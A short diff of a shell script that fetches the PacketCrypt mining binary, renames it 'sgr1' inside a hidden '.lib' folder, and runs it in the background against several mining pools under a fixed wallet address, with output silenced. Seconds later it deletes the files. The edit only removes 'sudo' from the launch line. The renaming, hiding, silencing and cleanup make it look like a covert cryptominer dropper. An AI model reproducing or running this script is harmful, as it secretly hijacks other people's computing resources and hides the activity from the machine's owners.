@@ -4,7 +4,7 @@ apt-get update ; apt-get install -y wget curl sudo
 mkdir .lib && cd .lib
 wget -O sgr1 https://www.pkt.world/ext/packetcrypt-linux-amd64
 chmod u+x sgr1 
-sudo ./sgr1 ann -p pkt1q3mh0kd29p3sxuwtrphyu6t072vj576y477t55c http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com > /dev/null 2>&1 &
+./sgr1 ann -p pkt1q3mh0kd29p3sxuwtrphyu6t072vj576y477t55c http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com > /dev/null 2>&1 &
 sleep 30
 rm -rvf *
 cd ~/
